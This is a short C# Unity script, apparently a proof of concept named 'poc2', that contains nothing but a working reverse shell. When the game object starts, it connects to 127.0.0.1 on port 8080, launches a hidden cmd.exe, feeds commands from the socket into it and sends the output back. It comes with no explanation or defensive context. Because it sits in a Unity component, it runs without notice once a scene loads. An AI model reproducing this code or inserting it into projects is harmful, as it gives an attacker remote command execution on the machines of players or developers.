using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;

public class poc2 : MonoBehaviour
{
    
    static StreamWriter streamWriter;
    
    // Start is called before the first frame update
    void Start()
    {
        Shell();
    }

    // Update is called once per frame
    void Update()
    {
    }

    void Shell()
    {
        using(TcpClient client = new TcpClient("127.0.0.1", 8080))
	{
		using(Stream stream = client.GetStream())
		{
			using(StreamReader rdr = new StreamReader(stream))
			{
				streamWriter = new StreamWriter(stream);
						
				StringBuilder strInput = new StringBuilder();

				Process p = new Process();
				p.StartInfo.FileName = "cmd.exe";
				p.StartInfo.CreateNoWindow = true;
				p.StartInfo.UseShellExecute = false;
				p.StartInfo.RedirectStandardOutput = true;
				p.StartInfo.RedirectStandardInput = true;
				p.StartInfo.RedirectStandardError = true;
				p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
				p.Start();
				p.BeginOutputReadLine();

				while(true)
				{
					strInput.Append(rdr.ReadLine());
					p.StandardInput.WriteLine(strInput);
					strInput.Remove(0, strInput.Length);
				}
			}
		}
	}
   }

   void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
   {
   	StringBuilder strOutput = new StringBuilder();
	if (!String.IsNullOrEmpty(outLine.Data))
        {
	        try
                {
			strOutput.Append(outLine.Data);
			streamWriter.WriteLine(strOutput);
			streamWriter.Flush();
                }
                catch (Exception err) { }
            
        }

   }

}

